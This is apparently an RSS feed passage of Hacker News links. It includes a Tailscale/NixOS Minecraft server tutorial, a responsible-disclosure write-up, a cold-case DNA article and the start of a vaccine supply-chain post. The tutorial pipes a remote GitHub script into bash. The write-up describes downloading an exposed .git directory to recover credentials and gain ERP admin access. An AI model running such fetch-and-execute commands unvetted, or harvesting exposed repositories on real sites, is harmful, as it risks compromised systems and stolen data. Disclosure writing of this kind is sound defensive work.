even have it in your current stack already for things like signing in with Google. It’s simple to set up - register your client, allow-list some redirect URIs and grab a Client ID and Secret. SAML on the other hand, while conceptually similar, requires configuration per customer instance, which makes a SAML integration a bit heavier of a lift. </p><p>​<a href="https://ossoapp.com/blog/1-0-0-release-candidate">Osso</a> allows you to sign SAML users in using an OAuth flow - it's SAML as OAuth instead of SAML vs. OAuth. Osso handles everything SAML - our Admin UI is easy for non-technical teammates to use in order to onboard customers and generates custom documentation for your customer’s Identity Provider. When your customer returns an XML metadata file to you, your teammates can easily upload it, where the required values get parsed out and persisted. Osso provides libraries for omniauth and Passport, making your integration even easier. You can even keep your sign in UX the same - Osso offers a hosted login page so you can just add a “Sign in with SSO” button or link (though we do recommend eventually deepening your integration by sending a user to Osso with a domain or email for IDP routing). </p></section></div>]]>
            </description>
            <link>https://ossoapp.com/blog/saml-vs-oauth</link>
            <guid isPermaLink="false">hacker-news-small-sites-25840413</guid>
            <pubDate>Tue, 19 Jan 2021 23:29:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Never Been Seen: Science Museum Group Collection]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25839733">thread link</a>) | @DyslexicAtheist
<br/>
January 19, 2021 | https://thesciencemuseum.github.io/never-been-seen/index.html | <a href="https://web.archive.org/web/*/https://thesciencemuseum.github.io/never-been-seen/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://thesciencemuseum.github.io/never-been-seen/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25839733</guid>
            <pubDate>Tue, 19 Jan 2021 22:24:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[After 55 years, Pecos Jane Doe identified]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25839639">thread link</a>) | @99_00
<br/>
January 19, 2021 | https://dnasolves.com/articles/pecos_jane_doe/ | <a href="https://web.archive.org/web/*/https://dnasolves.com/articles/pecos_jane_doe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
    In 1966, a young woman drowned in the Ropers Motel pool in Pecos, Texas and more than 50 years later she has been identified as Jolaine Hemmy
    </p><div>
    
        <p>You can help by contributing your DNA data or by contributing funding.</p>
    
    
        
    
    
</div><div id="article-description">
<p>In 1966, a young woman drowned in the Ropers Motel pool in Pecos, Texas and for more than 50 years her true identity was unknown. The young woman, known until recently as Pecos Jane Doe, checked into the Ropers Motel with an unknown male companion, using the names, Mr. and Mrs. Russell Battoun. Hours later, a hotel employee found the woman’s body in the hotel pool. As the woman was being taken away in an ambulance, her companion checked out of the hotel and was never seen again.</p>

<p>More than 50 years later, Pecos Police Department Chief Lisa Tarango, continued the search for Pecos Jane Doe’s true identity. The victim is buried with a gravestone marked, "Unknown Girl Drowned July 5, 1966" and agency officials have continued to visit her grave and bring flowers.&nbsp;Pecos PD worked with NamUs to collect dental and anthropological information, as well as to do the inital STR testing. </p>

<p>Othram reached out to the Pecos Police Department in early 2020 to help identify the woman using advanced DNA testing. The laboratory work was funded mostly by Pecos Police Department, with a supplementary crowdfund established through DNASolves. Skeletal remains were brought to Othram in August 2020 and work on the case began, first to develop a DNA extract from the bone, and then to construct a DNA profile using Forensic-Grade Genome Sequencing®. </p>

<p>The National Center for Missing and Exploited Children provided support and resources to faciliate an identification. First, NCMEC had produced an artistic sketch of what the woman might have looked like. Later, after successful DNA testing, they coordinated the genealogical research, securing the services of Innovative Forensic, who generously donated the time and resources to work family trees and produce a candidate lead. Pecos Police Department confirmed the lead through DNA testing of a close relative, confirming the identity of Pecos Jane Doe as Jolaine Hemmy. </p>

<p>Jolaine was 17 years old in 1966, working at a drive-in diner in Kansas City, Kansas. She abruptly vanished one day and didn't pick up her last paycheck. Her family reported her missing and worked hard to find out where she had gone and despite tremendous efforts by family and law enforcement, they were unable to find her. At least one family member remembers a man that took particular interest in Jolaine around the time of her disappearance, but little is known about him. Pecos Police Department is continuing to investigate. If anyone has information about Jolaine Hemmy, her disappearance, or the man that she was last seen with, please contact the Pecos Police Department at 432-445-4911 attention Cpl. Felix Salcido. </p>

<h6>About Othram Inc.</h6>

<p>Othram is the world’s first private DNA laboratory built specifically to apply the power of modern parallel sequencing to forensic evidence. Othram’s scientists are experts at recovery, enrichment, and analysis of human DNA from trace quantities of degraded or contaminated materials. Founded in 2018, and located in The Woodlands, Texas, our team works with academic researchers, forensic scientists, medical examiners, and law enforcement agencies to achieve results when other approaches have failed. Follow Othram on Twitter @OthramTech or visit Othram.com to learn how we can help you with your case. Visit dnasolves.com to learn how anyone can make a difference in helping solve the next cold case.</p>

</div></div>]]>
            </description>
            <link>https://dnasolves.com/articles/pecos_jane_doe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25839639</guid>
            <pubDate>Tue, 19 Jan 2021 22:15:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tailscale on NixOS: A New Minecraft Server in Ten Minutes]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25839107">thread link</a>) | @todsacerdoti
<br/>
January 19, 2021 | https://tailscale.com/blog/nixos-minecraft/ | <a href="https://web.archive.org/web/*/https://tailscale.com/blog/nixos-minecraft/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>NixOS is a Linux distribution built from the ground up to make it easy to deploy
services. Tailscale is a peer-to-peer VPN built to make it easy to connect
machines. In this article I will show how to set up a Java Edition
Minecraft server (exposed only over Tailscale) in ten minutes on Digital Ocean.</p>
<p>Before you begin this guide, you’ll need the following:</p>
<ul>
<li>A <a href="https://www.digitalocean.com/">Digital Ocean</a> account</li>
<li>A <a href="https://www.minecraft.net/en-us/">Minecraft</a> Java Edition account</li>
</ul>
<p>You’ll also need <a href="https://tailscale.com/start">a Tailscale account</a>. You can
make a free solo account using an <code>@gmail.com</code> address.</p>
<p>In NixOS one of the core principles is that the entire system is configurable
with a modular language called Nix. This allows you to configure everything
using a common syntax so you don’t need to remember every configuration file
format for every service you use. As such, you can configure an entire system
from a single file.</p>
<p>Let’s make a new configuration file called <code>host.nix</code> and set up a system that
has Tailscale start up on boot:</p>
<div><pre><code data-lang="nix"><span>{</span> <span>config</span><span>,</span> <span>pkgs</span><span>,</span> <span>...</span> <span>}:</span>

<span>{</span>
  <span># make the tailscale command usable to users</span>
  <span>environment</span><span>.</span><span>systemPackages</span> <span>=</span> <span>[</span> <span>pkgs</span><span>.</span><span>tailscale</span> <span>];</span>

  <span># enable the tailscale service</span>
  <span>services</span><span>.</span><span>tailscale</span><span>.</span><span>enable</span> <span>=</span> <span>true</span><span>;</span>
<span>}</span>
</code></pre></div><p>This will have Tailscale start up, however to authenticate to Tailscale we need
to take a few more steps. First, head to the <a href="https://login.tailscale.com/admin/authkeys">Pre-Auth Keys page in the admin
panel</a>.</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/preauth-key.png" alt="The key creation screen from the Tailscale adminUI"></p>
<p>Create a new one-time use key and then copy it to your notes. We will use it
below.</p>
<p>With this key we can write a <a href="https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files#the-service-section">systemd oneshot
unit</a>
that will log in to Tailscale using this key.</p>
<p>A systemd oneshot job is something that systemd expects to be run once as
opposed to being a persistent service. The above Digital Ocean link explains
this in more detail.</p>
<p>Copy this configuration below the <code>services.tailscale.enable</code> line in your
<code>host.nix</code> file:</p>
<div><pre><code data-lang="nix">  <span># ...</span>

  <span># create a oneshot job to authenticate to Tailscale</span>
  <span>systemd</span><span>.</span><span>services</span><span>.</span><span>tailscale-autoconnect</span> <span>=</span> <span>{</span>
    <span>description</span> <span>=</span> <span>"Automatic connection to Tailscale"</span><span>;</span>

    <span># make sure tailscale is running before trying to connect to tailscale</span>
    <span>after</span> <span>=</span> <span>[</span> <span>"network-pre.target"</span> <span>"tailscale.service"</span> <span>];</span>
    <span>wants</span> <span>=</span> <span>[</span> <span>"network-pre.target"</span> <span>"tailscale.service"</span> <span>];</span>
    <span>wantedBy</span> <span>=</span> <span>[</span> <span>"multi-user.target"</span> <span>];</span>

    <span># set this service as a oneshot job</span>
    <span>serviceConfig</span><span>.</span><span>Type</span> <span>=</span> <span>"oneshot"</span><span>;</span>

    <span># have the job run this shell script</span>
    <span>script</span> <span>=</span> <span>with</span> <span>pkgs</span><span>;</span> <span>''
</span><span>      # wait for tailscaled to settle
</span><span>      sleep 2
</span><span>
</span><span>      # check if we are already authenticated to tailscale
</span><span>      status="$(</span><span>${</span><span>tailscale</span><span>}</span><span>/bin/tailscale status -json | </span><span>${</span><span>jq</span><span>}</span><span>/bin/jq -r .BackendState)"
</span><span>      if [ $status = "Running" ]; then # if so, then do nothing
</span><span>        exit 0
</span><span>      fi
</span><span>
</span><span>      # otherwise authenticate with tailscale
</span><span>      </span><span>${</span><span>tailscale</span><span>}</span><span>/bin/tailscale up -authkey tskey-examplekeyhere
</span><span>    ''</span><span>;</span>
  <span>};</span>
</code></pre></div><p>Make sure to replace <code>tskey-examplekeyhere</code> with the key you got from the Admin
panel. Without this key your VPS cannot connect to Tailscale.</p>
<p>Now that we have Tailscale configured to authenticate and connect to your
network, let’s enable the lightweight NixOS firewall so that we can only allow
Minecraft traffic over Tailscale. The <a href="https://nixos.org/manual/nixos/stable/index.html#sec-firewall">NixOS
manual</a> has more
details, but at a high level we need to:</p>
<ul>
<li>Enable the firewall</li>
<li>Mark tailscale0 as a trusted interface</li>
<li>Allow anyone on the internet to connect to Tailscale’s UDP port (don’t worry,
they will be rejected if they are not a part of your network)</li>
<li>Allow anyone on the internet to connect to your server’s SSH port (this will
also work over Tailscale, but having it exposed over the public internet can
help when debugging issues that happen before tailscale starts)</li>
</ul>
<p>We can do that with the following configuration added to the end of your
<code>host.nix</code> file:</p>
<div><pre><code data-lang="nix">  <span># ...</span>
  <span>networking</span><span>.</span><span>firewall</span> <span>=</span> <span>{</span>
    <span># enable the firewall</span>
    <span>enable</span> <span>=</span> <span>true</span><span>;</span>

    <span># always allow traffic from your Tailscale network</span>
    <span>trustedInterfaces</span> <span>=</span> <span>[</span> <span>"tailscale0"</span> <span>];</span>

    <span># allow the Tailscale UDP port through the firewall</span>
    <span>allowedUDPPorts</span> <span>=</span> <span>[</span> <span>config</span><span>.</span><span>services</span><span>.</span><span>tailscale</span><span>.</span><span>port</span> <span>];</span>

    <span># allow you to SSH in over the public internet</span>
    <span>allowedTCPPorts</span> <span>=</span> <span>[</span> <span>22</span> <span>];</span>
  <span>};</span>
</code></pre></div><p>Now we can configure the Minecraft server. The <a href="https://search.nixos.org/options?channel=20.09&amp;show=services.minecraft-server.dataDir&amp;from=0&amp;size=30&amp;sort=relevance&amp;query=services.minecraft-server">Minecraft
options</a>
expose a number of settings you can use to configure your server however you
want. Please note that you <em>must</em> set the EULA agreement to <code>true</code> yourself. The
Minecraft server is a closed-source program, so you must give NixOS permission
to use closed source packages.</p>
<div><pre><code data-lang="nix">  <span># ...</span>
  <span>services</span><span>.</span><span>minecraft-server</span> <span>=</span> <span>{</span>
    <span>enable</span> <span>=</span> <span>true</span><span>;</span>
    <span>eula</span> <span>=</span> <span>false</span><span>;</span> <span># set to true if you agree to Mojang's EULA: https://account.mojang.com/documents/minecraft_eula</span>
    <span>declarative</span> <span>=</span> <span>true</span><span>;</span>

    <span># see here for more info: https://minecraft.gamepedia.com/Server.properties#server.properties</span>
    <span>serverProperties</span> <span>=</span> <span>{</span>
      <span>server-port</span> <span>=</span> <span>25565</span><span>;</span>
      <span>gamemode</span> <span>=</span> <span>"survival"</span><span>;</span>
      <span>motd</span> <span>=</span> <span>"NixOS Minecraft server on Tailscale!"</span><span>;</span>
      <span>max-players</span> <span>=</span> <span>5</span><span>;</span>
      <span>enable-rcon</span> <span>=</span> <span>true</span><span>;</span>
      <span># This password can be used to administer your minecraft server.</span>
      <span># Exact details as to how will be explained later. If you want</span>
      <span># you can replace this with another password.</span>
      <span>"rcon.password"</span> <span>=</span> <span>"hunter2"</span><span>;</span>
      <span>level-seed</span> <span>=</span> <span>"10292992"</span><span>;</span>
    <span>};</span>
  <span>};</span>

  <span># enable closed source packages such as the minecraft server</span>
  <span>nixpkgs</span><span>.</span><span>config</span><span>.</span><span>allowUnfree</span> <span>=</span> <span>true</span><span>;</span>
</code></pre></div><p>Now we have everything we need. We set up Tailscale, we configured an automatic
login to Tailscale, we set up the firewall so that it rejects all incoming
traffic (except for traffic from you Tailscale network) and finally we
configured the Minecraft server so that your can play in survival mode.</p>
<p>Now let’s get this put into a new Digital Ocean server. Open a new text editor
window and create a file called <code>user-data.yaml</code>. Copy this template into it:</p>
<div><pre><code data-lang="yaml"><span>#cloud-config</span><span>
</span><span></span><span>write_files</span><span>:</span><span>
</span><span>  </span>- <span>path</span><span>:</span><span> </span>/etc/nixos/host.nix<span>
</span><span>    </span><span>permissions</span><span>:</span><span> </span><span>"0644"</span><span>
</span><span>    </span><span>content</span><span>:</span><span> </span><span>|
</span><span>      { pkgs, config, ... }:</span><span>
</span><span>
</span><span>      </span>{<span>
</span><span>
</span><span>      </span>}<span>
</span><span>
</span><span></span><span>runcmd</span><span>:</span><span>
</span><span>  </span>- curl<span> </span>https<span>:</span>//raw.githubusercontent.com/elitak/nixos-infect/master/nixos-infect<span> </span>|<span> </span>PROVIDER=digitalocean<span> </span>NIXOS_IMPORT=./host.nix<span> </span>NIX_CHANNEL=nixos<span>-20.09</span><span> </span>bash<span> </span><span>2</span>&gt;<span>&amp;1</span><span> </span>|<span> </span>tee<span> </span>/tmp/infect.log<span>
</span></code></pre></div><p>At the time of this article being written, Digital Ocean doesn’t have a NixOS
image by default. So we will use
<a href="https://github.com/elitak/nixos-infect">nixos-infect</a> in order
to automatically replace an Ubuntu installation with a NixOS one. We are also
going to use it to automatically configure the server with the <code>host.nix</code> file
we just made.</p>
<p>Copy the contents of <code>host.nix</code> into the <code>content</code> value of the <code>write_files</code>
block. Be sure to indent the file by four spaces so that it will work as yaml
user data. When you are done you should have a file that looks something like
<a href="https://gist.github.com/Xe/b2f26ae62e7ff6f6030e4a94ed3e2707">this reference file</a>.</p>
<p>Now that you have the cloud config, let’s launch the server in the cloud.</p>
<p>Open the Digital Ocean control panel and click Create and then click Droplets.
Choose an Ubuntu 20.04 image and a plan with at least 4 GB of ram (the Minecraft
server needs a lot of resources, unfortunately).</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/droplet-tier.png" alt="The droplet config using Ubuntu 20.04 and a droplet with 4 GB ofram"></p>
<p>Then choose a datacenter near you and enable the IPv6 and User Data options.
Paste the contents of your <code>user-data.yaml</code> file into the text box that shows
up. Choose your SSH key in the list of SSH keys that shows up and then give the
droplet a hostname, such as “minecraft”. If you want you can enable backups.</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/user-data.png" alt="The droplet user data pasted into the user datafield"></p>
<p>Once you have everything set up, click the large green button labeled Create
Droplet. It may take up to 10 minutes to install and configure NixOS, however
you will be able to see the machine in your Tailscale network once everything is
done setting up. Go grab a cup of your favorite caffeinated beverage.</p>
<p>After it shows up in your network list, you can fire up your Minecraft
client and connect to your new server. You may need to select a slightly older
version of Minecraft if the in-game UI tells you to use an older version of
Minecraft. You can adjust the Minecraft version you are running using
<a href="https://help.minecraft.net/hc/en-us/articles/360034754852-Changing-game-versions-">the launcher UI</a>.</p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/host-info.png" alt="The host information in the Tailscale controlpanel"></p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/server-connect.png" alt="The minecraft server connectionUI"></p>
<p><img src="https://tailscale.com/files/images/docs/guides/nixos-minecraft/minecraft-world.png" alt="An in-game screenshot of the author’s Minecraft avatar in a forestbiome"></p>
<p>If you want to administer your minecraft server, you can add the <code>mcrcon</code>
package to your system config next to the <code>tailscale</code> package:</p>
<div><pre><code data-lang="nix">  <span>environment</span><span>.</span><span>systemPackages</span> <span>=</span> <span>with</span> <span>pkgs</span><span>;</span> <span>[</span> <span>tailscale</span> <span>mcrcon</span> <span>];</span>
</code></pre></div><p>Then you can connect to the Minecraft server command line with this command:</p>
<pre><code data-lang="console">$ mcrcon -p hunter2
</code></pre><p>If you adjusted the rcon password above, you will need to adjust this command to
include that new password. From there you can change gamemodes, adjust the time
of day and anything else you want.</p>
<p>Once <a href="https://tailscale.com/kb/1084/sharing">node sharing</a> is generally
available, you can use it to invite people you trust to your server. (Node
sharing is still in private beta.) Generate an invite link in the admin panel
and they can use that to join your adventure.</p>
<p>If you want to make configuration changes to your server after you provision it,
edit the <code>/etc/nixos/host.nix</code> file in your favorite text editor (such as nano).
The <a href="https://nixos.org/manual/nixos/stable/index.html#ch-configuration">NixOS
manual</a>
should help guide you if you want to install more services (such as backups
using <a href="https://christine.website/blog/borg-backup-2021-01-09">borgbackup</a> or
anything else listed in the <a href="https://search.nixos.org/options">options</a>). The
cloud’s the limit!</p>

    </div></div>]]>
            </description>
            <link>https://tailscale.com/blog/nixos-minecraft/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25839107</guid>
            <pubDate>Tue, 19 Jan 2021 21:27:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardening Docker and Kubernetes with Seccomp]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25838732">thread link</a>) | @dreamy_borg
<br/>
January 19, 2021 | https://martinheinz.dev/blog/41 | <a href="https://web.archive.org/web/*/https://martinheinz.dev/blog/41">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://martinheinz.dev/blog/41</link>
            <guid isPermaLink="false">hacker-news-small-sites-25838732</guid>
            <pubDate>Tue, 19 Jan 2021 20:53:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pwning an online retailer via public .git directory]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25838642">thread link</a>) | @nifoc
<br/>
January 19, 2021 | https://jomo.tv/security/git-pwning-retailer | <a href="https://web.archive.org/web/*/https://jomo.tv/security/git-pwning-retailer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <article itemscope="" itemtype="http://schema.org/BlogPosting">

    

    <section itemprop="articleBody">
      <p>A few days ago, I gained admin access to the <abbr title="Enterprise resource planning">ERP</abbr> system of a German-based international online retailer<sup id="fnref:1"><a href="#fn:1">1</a></sup> operating a number of e-commerce websites. The ERP system included sensitive employee data, customer data, and over 160k invoices. They quickly addressed the issues and the overall communication went very well.</p>

<hr>

<p>When I noticed that <code>https://███████24.de/.git/config</code> returned an actual git config file, I started investigating further. The file content itself only revealed the repository URL, which wasn’t publicly accessible. But the mere fact that the file was accessible gave away that the <code>.git</code> directory was not properly secured on the web server.</p>

<p>The <code>.git</code> directory exists in every git repository and contains all its information, including branches, commit history, etc. With access to the files within this directory, all that information can be downloaded piece by piece, for example using tools like <a href="https://github.com/liamg/gitjacker">gitjacker</a>. Directory listing on the web server is not required for this to work.</p>

<p>After restoring the downloaded git repository to a somewhat usable state, I had access to most of the repositories files and history and started looking around. The first thing I noticed were temporary files and backup files that shouldn’t have existed inside the webroot anyway, but were additionally added to the repository – perhaps by an incautious <code>git add .</code></p>

<p>I moved on loooking through files and found some <code>.json</code> configuration files in the repository that contained credentials:</p>

<pre><code>{
  "...": {
    "url": "http://█████████████████████████████",
    "username": "admin",
    "password": "123secret███",
    "database": "█████████████████████",
    // ...
  }
}
</code></pre>

<p>Even worse, the files being <code>.json</code> files, their content was – unlike <code>.php</code> files – publicly accessible from the web server, without even requiring any access to the git repository.</p>

<p><img src="https://jomo.tv/img/uos_erp_login.png#right" alt="ERP admin login"> The URL led to the company’s web based ERP system where I could simply log in with a web browser using the credentials from the JSON files.</p>

<p><img src="https://jomo.tv/img/uos_erp_menu.png" alt="The ERP system's menu bar" title="The ERP system's menu bar"></p>

<p>This gave me access to <em>a lot</em> of data and functionality, most of which was <abbr title="Personally identifiable information">PII</abbr> or company secrets. Some of these were:</p>

<ul>
  <li>Email messaging</li>
  <li>Employee’s calendars, including private data such as medical appointments, birthday parties, etc.</li>
  <li>Employee’s paid and unpaid leave requests, leave reason and approval status</li>
  <li>Internal issue tracker</li>
  <li>Warehouse / Inventory details</li>
  <li>Cost price and public price of products</li>
  <li>Over 160k customer invoices</li>
</ul>

<p>As I was logged in as admin, it was also possible to <strong>create</strong>, <strong>modify</strong> or <strong>delete</strong> any or all of this information. (I did not try this)</p>

<figure>
  <p><a href="https://jomo.tv/img/uos_erp_invoices.png" title="List of customer invoices"><img src="https://jomo.tv/img/uos_erp_invoices.png" alt="List of customer invoices"></a></p>
  <figcaption>List of customer invoices</figcaption>
</figure>

<figure>
  <p><a href="https://jomo.tv/img/uos_erp_invoice.png" title="A single customer invoice"><img src="https://jomo.tv/img/uos_erp_invoice.png#border" alt="A single customer invoice"></a></p>
  <figcaption>A single customer invoice</figcaption>
</figure>

<p>Due to the large amount of customer data being at risk, I notified the retailer that same night. They replied the next day, were thankful and addressed the security issues in a quick and responsible manner, which I find quite noteworthy. Thanks!</p>

<h2 id="discussion">Discussion</h2>

<p>Accidentally exposed .git directories are very common, but they remain an oversight like any other. It is hard to prevent all oversights from happening. However, storing credentials in (supposedly private) source code is much more negligent and can be easily avoided. In this case, it led to a much worse outcome of a comparatively harmless issue. Website operators should be careful not to include files in the webroot that shouldn’t be publicly accessible, or ensure the web server is properly configured to deny access to them.</p>

<p>To prevent credentials in your source code, you can replace sensitive data with environment variables, or you can place configuration files outside your repository and webroot.</p>

<h2 id="disclosure-timeline">Disclosure timeline</h2>

<div>
  <table>
    <tbody>
      <tr>
        <td><strong><time datetime="2020-12-29">2020-12-29</time></strong></td>
        <td>I gained access to the ERP system.</td>
      </tr>
      <tr>
        <td><strong><time datetime="2020-12-30">2020-12-30</time></strong></td>
        <td>I notified the retailer about the issues.</td>
      </tr>
      <tr>
        <td><strong><time datetime="2020-12-30">2020-12-30</time></strong></td>
        <td>The retailer replied that they have started fixing and intend to complete fixes by end of the day.</td>
      </tr>
      <tr>
        <td><strong><time datetime="2020-12-30">2020-12-30</time></strong></td>
        <td>The retailer notified me that fixes have been completed and decided to notify the data protection authority about the issues the same day.</td>
      </tr>
      <tr>
        <td><strong><time datetime="2020-12-31">2020-12-31</time></strong></td>
        <td>I confirmed the most critical issues have been fixed (.git no longer accessible, ERP password changed), pointed out some remaining smaller issues and gave additional advice. I also asked if a bug bounty is possible.</td>
      </tr>
      <tr>
        <td><strong><time datetime="2021-01-08">2021-01-08</time></strong></td>
        <td>The retailed replied that the remaining issues have been addressed and told me they will offer a bug bounty.</td>
      </tr>
      <tr>
        <td>	</td>
        <td><em>Some emails about handling the bug bounty and publication followed.</em></td>
      </tr>
      <tr>
        <td><strong><time datetime="2021-01-19">2021-01-19</time></strong></td>
        <td>Publication of this article.</td>
      </tr>
    </tbody>
  </table>

</div>

<p><em>I received a bug bounty of 500 €, half of which was donated to my local hacker space.</em></p>

<hr>



    </section>

    <section>Tags: git, webroot, vulnerability, breach</section>

    

  </article>
</div></div>]]>
            </description>
            <link>https://jomo.tv/security/git-pwning-retailer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25838642</guid>
            <pubDate>Tue, 19 Jan 2021 20:45:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring the Supply Chain of the Pfizer/BioNTech and Moderna Covid-19 Vaccines]]>
            </title>
            <description>
<![CDATA[
Score 180 | Comments 45 (<a href="https://news.ycombinator.com/item?id=25837899">thread link</a>) | @palcu
<br/>
January 19, 2021 | https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/ | <a href="https://web.archive.org/web/*/https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      <div>
  <p>
     ● 10 Jan 2021
  </p>
  
  <p><em>Sections of this post were co-authored by <a href="https://www.linkedin.com/in/cornelia-scheitz/">Cornelia Scheitz</a>. Last updated on January 20, 2021.</em></p>

<p>Bert Hubert’s excellent and widely shared article about <a href="https://berthub.eu/articles/posts/reverse-engineering-source-code-of-the-biontech-pfizer-vaccine/">Reverse Engineering the source code of the Pfizer-BioNTech SARS-CoV-2 Vaccine</a> is all it took to turn hundreds of software engineers and other Silicon Valley types into armchair vaccine experts overnight! Jokes aside, the article explains the 4284 base pair long mRNA inside the Pfizer-BioNTech’s COVID-19 vaccine for those who are more familiar with software than molecular biology.</p>

<p>Bert’s article is primarily about the biology of the vaccine, how it relates to the virus and how it works in the human body, but there’s this one sentence about vaccine production:</p>

<blockquote>
  <p>At the very beginning of the vaccine production process, someone uploaded this code to a DNA printer (yes), which then converted the bytes on disk to actual DNA molecules.</p>
</blockquote>

<p>Next to it is a picture of a <a href="https://codexdna.com/products/bioxp-system/">CodexDNA BioXP</a> device that is advertised as producing “custom DNA fragments of up to 7,000 base pairs”. Could this be the next <a href="https://en.wikipedia.org/wiki/Makers:_The_New_Industrial_Revolution">distributed manufacturing revolution</a>? This time with DNA printers making COVID-19 vaccines in our garages instead of 3D printers and plastic widgets?</p>

<p>I’ll start with the bad news: Nobody will be making an mRNA vaccine in their garage any time soon.</p>

<p>The following text is a collection of notes I wrote down while exploring the process for manufacturing and distributing the two new vaccines that have appeared all over the news and in more and more people’s arms over the recent weeks. I started reading about mRNA but quickly found myself on tangents about glass vials and temperature tracking devices.</p>

<p>This text was written over a week worth of evenings in early January 2021. It covers the two vaccines currently authorized for distribution in the United States where I live: One by Pfizer-BioNTech and one by Moderna. Several other mRNA based COVID-19 vaccines <a href="https://www.nytimes.com/interactive/2020/science/coronavirus-vaccine-tracker.html">are in various stages of clinical trials</a> and are likely similar to those covered here in some ways and different in others.</p>

<p>It is unlikely that I got everything right. Corrections and suggestions are welcome, please email jn@jonasneubert.com.</p>

<div>
    
        <p><img src="https://blog.jonasneubert.com/assets/2021/2021-01-10-moderna-vaccine-in-fridge.jpg" alt="Source/attribution: U.S. Navy Photo by Elaine Heirigs, NHC/NMRTC Lemoore public affairs/Released, https://www.flickr.com/photos/navymedicine/50755819886/"></p><p>Source/attribution: U.S. Navy Photo by Elaine Heirigs, NHC/NMRTC Lemoore public affairs/Released, https://www.flickr.com/photos/navymedicine/50755819886/</p>
    
</div>

<h2 id="ingredients-list">Ingredients List</h2>

<p>The list of ingredients, or “bill of materials” in engineering parlance, is a good starting point for understanding the supply chain of any product. The ingredient lists for both Pfizer-BioNTech and Moderna’s vaccines are public and have been widely reported.</p>

<p>The Pfizer-BioNTech vaccine is also known under its code name “BNT162b2”, it’s registered trademark “Comirnaty”, and its international non-proprietary name “Tozinameran”. The list of ingredients can be found in information material available on the various country-specific product websites on <a href="https://www.cvdvaccine.com/">www.cvdvaccine.com</a> or government websites like that of the <a href="https://www.gov.uk/government/publications/regulatory-approval-of-pfizer-biontech-vaccine-for-covid-19/information-for-healthcare-professionals-on-pfizerbiontech-covid-19-vaccine">UK’s MHRA</a>. There’s also a <a href="https://en.wikipedia.org/wiki/Tozinameran#Manufacturing">Wikipedia page</a>.</p>

<p>The Moderna vaccine is also known as “mRNA-1273”, but appears to lack a brand name other than “Moderna COVID-19 vaccine” which is what it says on the product label. The list of ingredients can be found on the <a href="https://www.modernatx.com/covid19vaccine-eua/">EUA factsheet on Moderna’s website</a>, or in these <a href="https://www.fda.gov/media/144434/download">FDA meeting notes</a>. It, too, has a <a href="https://en.wikipedia.org/wiki/MRNA-1273">Wikipedia entry</a>.</p>

<p>The two vaccines share some ingredients but not all. The following table is my attempt to sort the available information and compare the two.</p>

<table>
  <tbody><tr>
   <td>
   </td>
   <td>Pfizer-BioNTech
   </td>
   <td>Moderna
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Active Ingredient</span></strong>
   </td>
  </tr>
  <tr>
   <td>Comirnaty mRNA
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>mRNA-1273 mRNA
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Lipids</span></strong>
   </td>
  </tr>
  <tr>
   <td>Cholesterol
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>1,2-distearoyl-sn-glycero-3-phosphocholine (DSPC)
   </td>
   <td>✔
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>(4-hydroxybutyl)azanediyl)bis(hexane-6,1-diyl)bis(2- hexyldecanoate) (ALC-3015)
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>2-[(polyethylene glycol)-2000]-N,N-ditetradecylacetamide (ALC-0159)
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Lipid SM-102
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td>1,2-dimyristoyl-rac-glycero-3-methoxypolyethylene glycol-2000 (PEG2000-DMG)
   </td>
   <td>
   </td>
   <td>✔
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Buffer</span></strong>
   </td>
  </tr>
  <tr>
   <td>potassium chloride
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>monobasic potassium phosphate
   </td>
   <td>✔
   </td>
   <td>
   </td>
  </tr>
